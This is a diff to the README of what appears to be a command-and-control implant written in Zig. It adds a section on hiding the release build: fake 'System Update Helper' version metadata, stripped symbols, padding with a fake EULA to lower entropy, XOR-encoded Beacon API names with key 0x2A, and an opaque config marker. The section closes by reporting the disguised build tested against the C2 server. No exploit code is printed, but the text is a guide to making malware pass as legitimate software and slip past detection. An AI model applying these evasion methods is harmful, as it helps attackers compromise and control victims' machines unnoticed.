@@ -34,10 +34,46 @@ Requires Zig 0.16.0 (MSVC target — the default on Windows).
 
 ```sh
 zig build                              # debug, both exes
-zig build -Doptimize=ReleaseSmall      # release (~140 KB each, stripped)
+zig build -Doptimize=ReleaseSmall      # release (~150 KB each, stripped)
 ```
 
 Artifacts: `zig-out/bin/zig-implant.exe`, `zig-out/bin/zig-implant-silent.exe`.
+
+## Implant OPSEC / stealth (release build)
+
+The release implant is scrubbed to look like an ordinary "System Update Helper"
+application rather than a BOF C2 agent — the same layers as the Rust implant
+(`crates/implant`), ported to Zig:
+
+- **PE metadata** — `resource.rc` (compiled by Zig's built-in RC compiler via
+  `build.zig::addWin32ResourceFile`) embeds a VERSIONINFO + application manifest:
+  FileDescription/ProductName/CompanyName = "System Update Helper", FileVersion
+  10.0.22621.0, `asInvoker`, common-controls v6, Win7-11 supportedOS. Both exes
+  get it.
+- **Stripped** — `build.zig` sets `strip = true` on both modules, so the release
+  exe carries no debug info, no PDB reference, and no source paths.
+- **Benign string padding** — `src/stealth.zig` `export const benign_padding`
+  (`@embedFile` of `benign_strings.txt`, a fake EULA) dilutes the suspicious
+  strings in a `strings` dump and keeps entropy low (~6.6 bits/byte, normal PE
+  range). `main.zig::stealth.touch()` keeps the blob linked under LTO.
+- **XOR-encoded Beacon API names** — `exec.zig::buildExternalMap` registers the
+  Beacon stubs under names decoded at *runtime* from XOR'd byte arrays in
+  `stealth.zig` (`ENC_BEACON_*`, key 0x2A — shared with the Rust loader), so the
+  literals `BeaconPrintf`/`BeaconOutput`/… never appear in `.rdata`; only the
+  unrecognizable ciphertext does. The "Beacon" prefix check in
+  `resolveExternalByName` is likewise runtime-decoded. The Beacon stubs in
+  `beacon.zig` are intentionally NOT `export`'d (an exported symbol name would
+  land in the export table as plaintext) — their addresses are taken with
+  `@intFromPtr`, which is enough to retain them. CRT names (`memcpy`/`__chkstk`/
+  …) stay literal — every C program has them.
+- **Opaque trailer magic** — the appended-config marker is the byte sequence
+  `0x7C 0x53 0x9A 0x2E 0xD1 0x04 0xB8 0x6F 0x11 0xA3` (not a readable word),
+  shared with `crates/implant`, `tools/stubbuilder`, and the Go core
+  `stub_patcher.go`. Change it in all of them together.
+
+Result: no `Beacon*`/`implant`/`ruststrike`/`zig-implant` strings, entropy
+~6.6 bits/byte, VERSIONINFO reads "System Update Helper". Verified end-to-end
+against the Go core after the scrub (connect + sysinfo + cmd_exec + proc_list).
 
 ## Run
 
